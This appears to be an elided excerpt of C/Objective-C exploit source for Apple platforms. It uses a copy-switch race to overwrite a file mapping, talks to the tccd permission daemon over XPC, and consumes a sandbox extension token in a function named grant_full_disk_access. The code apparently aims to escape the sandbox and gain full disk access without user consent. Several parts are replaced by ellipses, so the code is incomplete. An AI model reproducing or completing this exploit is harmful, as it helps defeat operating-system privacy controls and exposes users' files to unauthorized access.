...
void xpc_crasher(const char * name)
{
    for (int i = 0; i < 10; i++) {
        printf("[*] xpc_crasher %s \n",name);
        sleep(1);
    }
}
...
// Fix Xcode 15.4+ XPC headers
extern xpc_connection_t tix_xpc_connection_create_mach_service(const char *name, dispatch_queue_t targetq, uint64_t flags) __asm__("_xpc_connection_create_mach_service");
...
static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
  ...
  xpc_connection_t connection = tix_xpc_connection_create_mach_service(
  ...
  for (int off = 0; off < sourceData.length; off += 0x4000) {
    ...
    for (int i = 0; i < 2; i++) {
      if (unaligned_copy_switch_race(
              ...
              off + 0x4000 > sourceData.length ? sourceData.length - off : 0x4000, false)) {
        success = true;
        break;
      }
    }
...
static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
  ...
  if (!overwrite_file_mapping(targetMap, sourceData.bytes, targetLength)) {
...
void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
    ...
    if (cachedToken) {
        ...
        NSLog(@"sandbox_extension_consume with cachedToken %@  handle: %d \n",cachedToken,handle);
        if (handle > 0) {
